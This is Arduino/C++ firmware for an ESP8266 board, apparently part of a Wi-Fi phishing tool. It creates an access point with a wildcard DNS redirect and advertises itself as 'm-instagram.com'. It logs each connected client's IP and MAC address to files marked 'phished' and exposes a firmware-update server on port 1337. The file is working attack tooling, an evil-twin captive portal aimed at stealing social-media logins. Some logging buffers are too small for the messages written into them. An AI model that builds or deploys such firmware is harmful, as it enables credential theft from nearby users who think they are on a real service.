#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <ESP8266HTTPClient.h>
#include <ESP8266httpUpdate.h>
#include <ESP8266HTTPUpdateServer.h>
#include <ESP8266mDNS.h>
#include <FS.h>
#include <ArduinoJson.h>
//#include <ESP8266FtpServer.h> // https://github.com/exploitagency/esp8266FTPServer/tree/feature/bbx10_speedup
#include <DNSServer.h>

// DEFININDO TIPOS DE ARQUIVOS
const byte DNS_PORT = 53;
const char W_PORTAL[] PROGMEM = "esp.portal"; // Domínio do portal cativo (alternativa ao 192.168.4.1)
const char W_HTML[] PROGMEM = "text/html";
const char W_CSS[] PROGMEM = "text/css";
const char W_JS[] PROGMEM = "application/javascript";
const char W_PNG[] PROGMEM = "image/png";
const char W_GIF[] PROGMEM = "image/gif";
const char W_JPG[] PROGMEM = "image/jpeg";
const char W_ICON[] PROGMEM = "image/x-icon";
const char W_XML[] PROGMEM = "text/xml";
const char W_XPDF[] PROGMEM = "application/x-pdf";
const char W_XZIP[] PROGMEM = "application/x-zip";
const char W_GZIP[] PROGMEM = "application/x-gzip";
const char W_JSON[] PROGMEM = "application/json";
const char W_TXT[] PROGMEM = "text/plain";

const char W_DOT_HTM[] PROGMEM = ".htm";
const char W_DOT_HTML[] PROGMEM = ".html";
const char W_DOT_CSS[] PROGMEM = ".css";
const char W_DOT_JS[] PROGMEM = ".js";
const char W_DOT_PNG[] PROGMEM = ".png";
const char W_DOT_GIF[] PROGMEM = ".gif";
const char W_DOT_JPG[] PROGMEM = ".jpg";
const char W_DOT_ICON[] PROGMEM = ".ico";
const char W_DOT_XML[] PROGMEM = ".xml";
const char W_DOT_PDF[] PROGMEM = ".pdf";
const char W_DOT_ZIP[] PROGMEM = ".zip";
const char W_DOT_GZIP[] PROGMEM = ".gz";
const char W_DOT_JSON[] PROGMEM = ".json";

String W_WEBINTERFACE = "/web";  // Pasta padrão contendo os arquivos da web

String update_path = "/update";

ESP8266WebServer server(80);
ESP8266WebServer httpServer(1337);
ESP8266HTTPUpdateServer httpUpdater;
DNSServer dnsServer;
HTTPClient http;

void requireAuthentication() {
  if (!server.authenticate(update_username, update_password)) {
    return server.requestAuthentication();
  }
}

void sendProgmem(const char* ptr, size_t size, const char* type) {
  server.sendHeader("Content-Encoding", "gzip");
  server.sendHeader("Cache-Control", "max-age=86400");
  server.send_P(200, type, ptr, size);
}

void returnFail(String msg) {
  logging("returnFail :: error 500 hit");
  server.sendHeader("Connection", "close");
  server.sendHeader("Access-Control-Allow-Origin", "*");
  server.send(500, "text/plain", msg + "\r\n");
}

void handleSubmitSettings() {
  String SETTINGSvalue;

  if (!server.hasArg("SETTINGS")) return returnFail("BAD ARGS");

  SETTINGSvalue = server.arg("SETTINGS");
  whiteHat = server.arg("whiteHat").toInt();
  Serial.println(whiteHat);
  server.arg("ssid").toCharArray(ssid, 32);
  server.arg("password").toCharArray(password, 64);
  channel = server.arg("channel").toInt();
  hidden = server.arg("hidden").toInt();
  server.arg("local_IPstr").toCharArray(local_IPstr, 16);
  server.arg("gatewaystr").toCharArray(gatewaystr, 16);
  server.arg("subnetstr").toCharArray(subnetstr, 16);
  server.arg("update_username").toCharArray(update_username, 32);
  server.arg("update_password").toCharArray(update_password, 64);
  server.arg("ftp_username").toCharArray(ftp_username, 32);
  server.arg("ftp_password").toCharArray(ftp_password, 64);
  ftpenabled = server.arg("ftpenabled").toInt();
  esportalenabled = server.arg("esportalenabled").toInt();

  if (SETTINGSvalue == "1") {
    logging("handleSubmitSettings :: New setting uploaded");
    saveSettingsJSON();
    loadSettingJSON();
    ESP.restart();
  } else {
    returnFail("Bad SETTINGS value");
  }
}

void client_status() {
  unsigned char number_client;
  struct station_info *stat_info;

  struct ip4_addr *IPaddress;
  IPAddress address;
  int i = 1;
  number_client = wifi_softap_get_station_num();
  stat_info = wifi_softap_get_station_info();

  stationConnected = (number_client > 0) ? 1 : 0;

  while (stat_info != NULL) {
    DynamicJsonDocument json(500);

    IPaddress = &stat_info->ip;
    address = IPaddress->addr;

    char stationIP[50] = "";
    sprintf(stationIP, "%d.%d.%d.%d", address[0], address[1], address[2], address[3]);

    char stationMac[32] = "";
    sprintf(stationMac, "%02X:%02X:%02X:%02X:%02X:%02X",
            stat_info->bssid[0], stat_info->bssid[1], stat_info->bssid[2],
            stat_info->bssid[3], stat_info->bssid[4], stat_info->bssid[5]);

    stationID = 0;
    for (int j = 0; j < 6; j++) {
        stationID += stat_info->bssid[j];
    }

    json["id"] = stationID;
    json["ip"] = stationIP;
    json["mac"] = stationMac;
    json["phished"] = "NO";

    char filename[50];
    sprintf(filename, "/stations/%d.json", stationID);
    File jsonStation = SPIFFS.open(filename, "w");
    if (jsonStation) {
        serializeJson(json, jsonStation);
        jsonStation.close();
    }

    sprintf(filename, "/connected/%d.json", stationID);
    File jsonConnect = SPIFFS.open(filename, "w");
    if (jsonConnect) {
        serializeJson(json, jsonConnect);
        jsonConnect.close();
    }

    stat_info = STAILQ_NEXT(stat_info, next);
    i++;
  }
}

bool handleFileRead(const char* path, const char* type) {
  String contentType = type;
  if (SPIFFS.exists(path)) {
    File file = SPIFFS.open(path, "r");
    size_t sent = server.streamFile(file, contentType);
    file.close();
    return true;
  }
  char fileinquestion[50];
  sprintf(fileinquestion, "handleFileRead :: File not found %s", path);
  logging(fileinquestion);
  return false;
}

void startAP() {
  logging("startAP :: Starting Access Point");
  WiFi.disconnect(true);
  WiFi.mode(WIFI_AP);
  IPAddress local_IP;
  local_IP.fromString(local_IPstr);
  IPAddress gateway;
  gateway.fromString(gatewaystr);
  IPAddress subnet;
  subnet.fromString(subnetstr);
  byte mac[6];
  WiFi.macAddress(mac);
  sprintf(local_MAC, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

  if (!WiFi.softAP(ssid, password, channel, hidden)) {
    char softapsmsg[50];
    sprintf(softapsmsg, "startAP :: Error starting softAP : ssid %s, password %s, channel %d, hidden %d", ssid, password, channel, hidden);
    logging(softapsmsg);
    ESP.restart();
  }

  if (!WiFi.softAPConfig(local_IP, gateway, subnet)) {
    char softapconfigsmsg[50];
    sprintf(softapconfigsmsg, "startAP :: Error starting softAPConfig : local_IP %s, gateway %s, subnet %s", local_IPstr, gatewaystr, subnetstr);
    logging(softapconfigsmsg);
    logging("Restarting ESP");
    ESP.restart();
  }

  MDNS.begin("m-instagram.com");
  httpUpdater.setup(&httpServer, update_path, update_username, update_password);
  httpServer.begin();

  MDNS.addService("http", "tcp", 1337);
  dnsServer.start(DNS_PORT, "*", local_IP);

  server.begin();
  WiFiClient client;
  client.setNoDelay(1);
}
